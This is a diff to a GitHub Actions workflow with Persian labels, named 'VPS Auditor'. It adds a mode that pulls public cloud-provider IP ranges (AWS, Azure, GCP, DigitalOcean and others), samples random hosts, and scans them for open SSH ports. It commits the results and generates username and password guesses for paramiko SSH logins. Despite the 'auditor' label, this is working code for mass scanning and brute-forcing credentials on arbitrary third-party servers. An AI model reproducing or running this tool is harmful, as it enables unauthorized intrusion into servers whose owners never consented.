@@ -1,22 +1,41 @@
-name: VPS Auditor – Explorer Mode
+name: VPS Auditor - Auto DataCenter IP Discovery
 
 on:
   workflow_dispatch:
     inputs:
       mode:
-        description: 'حالت'
+        description: 'حالت اسکن'
         required: true
         default: 'explorer'
         type: choice
         options:
           - explorer
+          - datacenter
           - auto
           - manual
       scan_range:
-        description: 'رنج CIDR (برای explorer) - مثال: 192.168.1.0/24'
+        description: 'رنج CIDR (برای explorer)'
         required: false
+      datacenter_provider:
+        description: 'پرووایدر دیتاسنتر (برای datacenter)'
+        required: false
+        default: 'all'
+        type: choice
+        options:
+          - all
+          - aws
+          - azure
+          - gcp
+          - digitalocean
+          - linode
+          - vultr
+          - cloudflare
+      max_ips:
+        description: 'حداکثر تعداد آیپی برای اسکن (برای datacenter)'
+        required: false
+        default: '500'
       keywords:
-        description: 'کلمات کلیدی برای ListForge (برای auto/explorer)'
+        description: 'کلمات کلیدی برای ListForge'
         required: false
       targets:
         description: 'IPهای دستی (برای manual)'
@@ -46,12 +65,14 @@ jobs:
       - uses: actions/checkout@v4
 
       - name: نصب
-        run: pip3 install paramiko rich
+        run: pip3 install paramiko rich requests ipaddress
 
       - name: اجرای VPS Auditor
         env:
           MODE: ${{ github.event.inputs.mode }}
           SCAN_RANGE: ${{ github.event.inputs.scan_range }}
+          DC_PROVIDER: ${{ github.event.inputs.datacenter_provider }}
+          MAX_IPS: ${{ github.event.inputs.max_ips }}
           KEYWORDS: ${{ github.event.inputs.keywords }}
           TARGETS_INPUT: ${{ github.event.inputs.targets }}
           USERNAMES_INPUT: ${{ github.event.inputs.usernames }}
@@ -60,7 +81,7 @@ jobs:
           TIMEOUT: ${{ github.event.inputs.timeout }}
         run: |
           python3 << 'PYEOF'
-          import os, sys, socket, time, ipaddress, concurrent.futures, random
+          import os, sys, socket, time, ipaddress, concurrent.futures, random, requests, json, re
           from datetime import datetime
           from rich.console import Console
           from rich.table import Table
@@ -68,22 +89,122 @@ jobs:
           import paramiko
 
           console = Console()
-          console.print(Panel.fit("[bold yellow]🗝️ VPS Auditor – Explorer Mode[/bold yellow]", border_style="yellow"))
+          console.print(Panel.fit("[bold yellow]🗝️ VPS Auditor – DataCenter Mode[/bold yellow]", border_style="yellow"))
 
           MODE = os.environ["MODE"]
           PORT = int(os.environ["PORT"])
           TIMEOUT = int(os.environ["TIMEOUT"])
+          MAX_IPS = int(os.environ.get("MAX_IPS", "500"))
+          DC_PROVIDER = os.environ.get("DC_PROVIDER", "all")
 
           # ===== ۱. IP Discovery =====
           targets = []
 
-          if MODE == "explorer":
+          if MODE == "datacenter":
+              console.print(f"[cyan]🌐 دریافت لیست آیپی دیتاسنترها...[/cyan]")
+
+              # منبع ۱: jhassine/server-ip-addresses (AWS, Azure, GCP, Cloudflare)
+              datacenter_urls = []
+              
+              if DC_PROVIDER in ("all", "aws", "azure", "gcp", "cloudflare"):
+                  try:
+                      resp = requests.get("https://raw.githubusercontent.com/jhassine/server-ip-addresses/master/data/datacenters.txt", timeout=30)
+                      for line in resp.text.splitlines():
+                          line = line.strip()
+                          if line and not line.startswith("#"):
+                              datacenter_urls.append(line)
+                      console.print(f"[green]✓ {len(datacenter_urls)} CIDR از jhassine/server-ip-addresses[/green]")
+                  except Exception as e:
+                      console.print(f"[yellow]⚠️ jhassine در دسترس نیست: {e}[/yellow]")
+
+              # منبع ۲: rezmoss/cloud-provider-ip-addresses (جامع‌تر)
+              provider_map = {
+                  "aws": "aws", "azure": "azure", "gcp": "googlecloud",
+                  "digitalocean": "digitalocean", "linode": "linode",
+                  "vultr": "vultr", "cloudflare": "cloudflare"
+              }
+
+              try:
+                  base_url = "https://raw.githubusercontent.com/rezmoss/cloud-provider-ip-addresses/master/data"
+                  if DC_PROVIDER == "all":
+                      for provider in provider_map.values():
+                          try:
+                              resp = requests.get(f"{base_url}/{provider}-ip-ranges.json", timeout=30)
+                              data = resp.json()
+                              for item in data.get("prefixes", []):
+                                  if "ipv4Prefix" in item:
+                                      datacenter_urls.append(item["ipv4Prefix"])
+                              console.print(f"[green]✓ rezmoss/{provider} دریافت شد[/green]")
+                          except:
+                              pass
+                  else:
+                      provider = provider_map.get(DC_PROVIDER, DC_PROVIDER)
+                      try:
+                          resp = requests.get(f"{base_url}/{provider}-ip-ranges.json", timeout=30)
+                          data = resp.json()
+                          for item in data.get("prefixes", []):
+                              if "ipv4Prefix" in item:
+                                  datacenter_urls.append(item["ipv4Prefix"])
+                          console.print(f"[green]✓ rezmoss/{provider} دریافت شد[/green]")
+                      except Exception as e:
+                          console.print(f"[yellow]⚠️ rezmoss در دسترس نیست: {e}[/yellow]")
+              except Exception as e:
+                  console.print(f"[yellow]⚠️ rezmoss کامل در دسترس نیست: {e}[/yellow]")
+
+              # استخراج آیپی از CIDRها
+              all_ips = set()
+              for cidr in datacenter_urls[:200]:  # محدود به ۲۰۰ CIDR برای سرعت
+                  try:
+                      network = ipaddress.IPv4Network(cidr, strict=False)
+                      # برای هر CIDR چند آیپی تصادفی انتخاب کن
+                      hosts = list(network.hosts())
+                      sample_size = min(5, len(hosts))
+                      for ip in random.sample(hosts, sample_size):
+                          all_ips.add(str(ip))
+                  except:
+                      pass
+
+              targets = list(all_ips)[:MAX_IPS]
+              console.print(f"[green]✅ {len(targets)} آیپی دیتاسنتر برای اسکن انتخاب شد[/green]")
+
+              # اسکن سریع پورت ۲۲
+              console.print(f"🔍 اسکن {len(targets)} آیپی برای پورت {PORT}...")
+              open_ips = []
+
+              def check_ip(ip):
+                  try:
+                      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                      sock.settimeout(0.5)
+                      result = sock.connect_ex((ip, PORT))
+                      sock.close()
+                      return ip if result == 0 else None
+                  except:
+                      return None
+
+              with concurrent.futures.ThreadPoolExecutor(max_workers=300) as executor:
+                  future_to_ip = {executor.submit(check_ip, ip): ip for ip in targets}
+                  for future in concurrent.futures.as_completed(future_to_ip):
+                      ip = future.result()
+                      if ip:
+                          open_ips.append(ip)
+                          console.print(f"[green]✓ {ip}[/green]")
+
+              targets = open_ips
+              console.print(f"\n[green]✅ {len(targets)} آیپی با پورت {PORT} باز پیدا شد[/green]")
+
+              # ذخیره
+              with open("discovered_ips.txt", "w") as f:
+                  for ip in targets:
+                      f.write(ip + "\n")
+              os.system("git add discovered_ips.txt && git commit -m 'DataCenter IPs' && git push 2>/dev/null || true")
+
+          elif MODE == "explorer":
               scan_range = os.environ.get("SCAN_RANGE", "").strip()
               if not scan_range:
                   console.print("[red]❌ برای Explorer Mode باید scan_range وارد کنید[/red]")
                   sys.exit(1)
 
-              console.print(f"🔍 Explorer Mode: اسکن {scan_range} برای پورت {PORT}...")
+              console.print(f"🔍 Explorer Mode: اسکن {scan_range}...")
               try:
                   network = ipaddress.IPv4Network(scan_range, strict=False)
                   ips = [str(ip) for ip in network.hosts()]
@@ -91,7 +212,6 @@ jobs:
                   console.print("[red]❌ رنج CIDR نامعتبر[/red]")
                   sys.exit(1)
 
-              console.print(f"⏳ اسکن {len(ips)} آی‌پی با 300 نخ هم‌زمان...")
               def check_ip(ip):
                   try:
                       sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -110,7 +230,7 @@ jobs:
                           targets.append(ip)
                           console.print(f"[green]✓ {ip}[/green]")
 
-              console.print(f"\n[green]✅ {len(targets)} آی‌پی با پورت {PORT} باز پیدا شد[/green]")
+              console.print(f"\n[green]✅ {len(targets)} آیپی با پورت {PORT} باز[/green]")
               with open("discovered_ips.txt", "w") as f:
                   for ip in targets:
                       f.write(ip + "\n")
@@ -127,6 +247,8 @@ jobs:
           if not targets:
               console.print("[red]❌ هیچ IP هدفی پیدا نشد[/red]")
               sys.exit(1)
+
+          console.print(f"🎯 تعداد هدف‌ها: {len(targets)}")
 
           # ===== ۲. ListForge =====
           def generate_usernames(keywords):
@@ -149,11 +271,10 @@ jobs:
                   base.append(kw_lower); base.append(kw_cap)
               return list(set(base))
 
-          if MODE in ("explorer", "auto"):
+          if MODE in ("datacenter", "explorer", "auto"):
               keywords_input = os.environ.get("KEYWORDS", "").strip()
               if not keywords_input:
-                  console.print("[yellow]⚠️ کلمه کلیدی وارد نشد. از پیش‌فرض استفاده می‌شود[/yellow]")
-                  keywords_input = "admin,web,server,vps"
+                  keywords_input = "admin,web,server,vps,cloud,host"
               keywords = [k.strip() for k in keywords_input.split(',') if k.strip()]
               usernames = generate_usernames(keywords)
               passwords = generate_passwords(keywords)
